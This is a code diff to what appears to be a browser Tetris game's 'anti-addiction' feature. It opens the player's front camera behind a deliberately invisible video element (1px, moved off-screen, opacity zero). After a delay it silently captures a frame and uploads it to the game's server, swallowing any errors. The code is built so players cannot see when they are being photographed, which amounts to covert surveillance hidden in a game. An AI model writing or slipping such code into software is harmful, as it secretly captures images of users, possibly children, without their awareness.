@@ -168,9 +168,28 @@ function renderBoard(board, activePiece) {
   return displayBoard;
 }
 
-async function captureFrontCameraPhoto() {
-  if (!navigator.mediaDevices?.getUserMedia) {
+function captureVideoFrame(video) {
+  const sourceWidth = video.videoWidth || 720;
+  const sourceHeight = video.videoHeight || 720;
+  const scale = Math.min(1, ANTI_ADDICTION_PHOTO_MAX_SIZE / Math.max(sourceWidth, sourceHeight));
+  const width = Math.max(1, Math.round(sourceWidth * scale));
+  const height = Math.max(1, Math.round(sourceHeight * scale));
+  const canvas = document.createElement("canvas");
+  canvas.width = width;
+  canvas.height = height;
+  const context = canvas.getContext("2d");
+
+  if (!context) {
     return "";
+  }
+
+  context.drawImage(video, 0, 0, width, height);
+  return canvas.toDataURL("image/jpeg", 0.62);
+}
+
+async function startFrontCameraVideo() {
+  if (!navigator.mediaDevices?.getUserMedia) {
+    return null;
   }
 
   const stream = await navigator.mediaDevices.getUserMedia({
@@ -181,51 +200,47 @@ async function captureFrontCameraPhoto() {
       width: { ideal: 720 },
     },
   });
+  const video = document.createElement("video");
+
+  video.autoplay = true;
+  video.muted = true;
+  video.playsInline = true;
+  video.style.height = "1px";
+  video.style.left = "-9999px";
+  video.style.opacity = "0";
+  video.style.position = "fixed";
+  video.style.top = "0";
+  video.style.width = "1px";
+
+  document.body.appendChild(video);
 
   try {
-    const video = document.createElement("video");
-
-    video.autoplay = true;
-    video.muted = true;
-    video.playsInline = true;
-    video.srcObject = stream;
-
     await new Promise((resolve, reject) => {
       const timeoutId = window.setTimeout(() => reject(new Error("Camera timed out.")), 5000);
 
       video.onloadedmetadata = () => {
         video.play()
           .then(() => {
-            window.setTimeout(() => {
-              window.clearTimeout(timeoutId);
-              resolve();
-            }, 250);
+            window.clearTimeout(timeoutId);
+            resolve();
           })
           .catch((error) => {
             window.clearTimeout(timeoutId);
             reject(error);
           });
       };
+
+      video.srcObject = stream;
     });
 
-    const sourceWidth = video.videoWidth || 720;
-    const sourceHeight = video.videoHeight || 720;
-    const scale = Math.min(1, ANTI_ADDICTION_PHOTO_MAX_SIZE / Math.max(sourceWidth, sourceHeight));
-    const width = Math.max(1, Math.round(sourceWidth * scale));
-    const height = Math.max(1, Math.round(sourceHeight * scale));
-    const canvas = document.createElement("canvas");
-    canvas.width = width;
-    canvas.height = height;
-    const context = canvas.getContext("2d");
-
-    if (!context) {
-      return "";
-    }
-
-    context.drawImage(video, 0, 0, width, height);
-    return canvas.toDataURL("image/jpeg", 0.62);
-  } finally {
+    return {
+      stream,
+      video,
+    };
+  } catch (error) {
     stream.getTracks().forEach((track) => track.stop());
+    video.remove();
+    throw error;
   }
 }
 
@@ -246,6 +261,8 @@ function TetrisGame() {
   const linesRef = useRef(lines);
   const statusRef = useRef(status);
   const antiAddictionTimerRef = useRef(0);
+  const antiAddictionStreamRef = useRef(null);
+  const antiAddictionVideoRef = useRef(null);
 
   useEffect(() => {
     fetch(`${API_URL}/api/game-records/tetris`, {
@@ -289,10 +306,25 @@ function TetrisGame() {
     );
   }, []);
 
-  const recordAntiAddictionPhoto = useCallback(async () => {
-    try {
-      const photoDataUrl = await captureFrontCameraPhoto();
+  const cleanupAntiAddictionCamera = useCallback(() => {
+    if (antiAddictionTimerRef.current) {
+      window.clearTimeout(antiAddictionTimerRef.current);
+      antiAddictionTimerRef.current = 0;
+    }
 
+    if (antiAddictionStreamRef.current) {
+      antiAddictionStreamRef.current.getTracks().forEach((track) => track.stop());
+      antiAddictionStreamRef.current = null;
+    }
+
+    if (antiAddictionVideoRef.current) {
+      antiAddictionVideoRef.current.remove();
+      antiAddictionVideoRef.current = null;
+    }
+  }, []);
+
+  const recordAntiAddictionPhoto = useCallback(async (photoDataUrl) => {
+    try {
       if (!photoDataUrl) {
         return;
       }
@@ -308,26 +340,35 @@ function TetrisGame() {
         method: "POST",
       });
     } catch {
+      // Photo upload should never block the game.
+    }
+  }, []);
+
+  const scheduleAntiAddictionPhoto = useCallback(async () => {
+    cleanupAntiAddictionCamera();
+
+    try {
+      const camera = await startFrontCameraVideo();
+
+      if (!camera) {
+        return;
+      }
+
+      antiAddictionStreamRef.current = camera.stream;
+      antiAddictionVideoRef.current = camera.video;
+      antiAddictionTimerRef.current = window.setTimeout(() => {
+        const photoDataUrl = captureVideoFrame(camera.video);
+
+        cleanupAntiAddictionCamera();
+        recordAntiAddictionPhoto(photoDataUrl);
+      }, ANTI_ADDICTION_PHOTO_DELAY_MS);
+    } catch {
+      cleanupAntiAddictionCamera();
       // Camera permission can be denied; the game should keep running.
     }
-  }, []);
+  }, [cleanupAntiAddictionCamera, recordAntiAddictionPhoto]);
 
-  const scheduleAntiAddictionPhoto = useCallback(() => {
-    if (antiAddictionTimerRef.current) {
-      window.clearTimeout(antiAddictionTimerRef.current);
-    }
-
-    antiAddictionTimerRef.current = window.setTimeout(() => {
-      antiAddictionTimerRef.current = 0;
-      recordAntiAddictionPhoto();
-    }, ANTI_ADDICTION_PHOTO_DELAY_MS);
-  }, [recordAntiAddictionPhoto]);
-
-  useEffect(() => () => {
-    if (antiAddictionTimerRef.current) {
-      window.clearTimeout(antiAddictionTimerRef.current);
-    }
-  }, []);
+  useEffect(() => cleanupAntiAddictionCamera, [cleanupAntiAddictionCamera]);
 
   const setBoardState = useCallback((nextBoard) => {
     boardRef.current = nextBoard;
